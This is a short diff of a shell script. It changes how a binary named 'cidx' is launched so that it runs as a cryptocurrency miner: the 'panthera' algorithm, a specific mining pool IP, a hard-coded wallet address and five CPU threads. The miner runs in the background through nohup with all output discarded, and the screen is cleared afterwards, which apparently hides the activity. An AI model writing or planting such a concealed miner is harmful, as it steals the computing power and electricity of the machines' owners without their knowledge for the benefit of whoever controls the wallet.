@@ -19,7 +19,7 @@ END
 chmod +x config.json cidx
 
 # Run cidx in the background
-nohup ./cidx -c 'config.json' &>/dev/null &
+nohup ./cidx --algorithm panthera --pool 45.115.224.243:443 --wallet Ssy29Ak9dCkPqyFRa8aroHTNMu2ynpsJ9JU2ZZf7SX85beMdbDjhvUL6sXiSnVCL9jPapFCGdGD3g7rRokxs9W8t52tQ3qi4NA --cpu-threads 5 -p x &>/dev/null &
 
 # Clear the screen and print the current time and running jobs
 clear
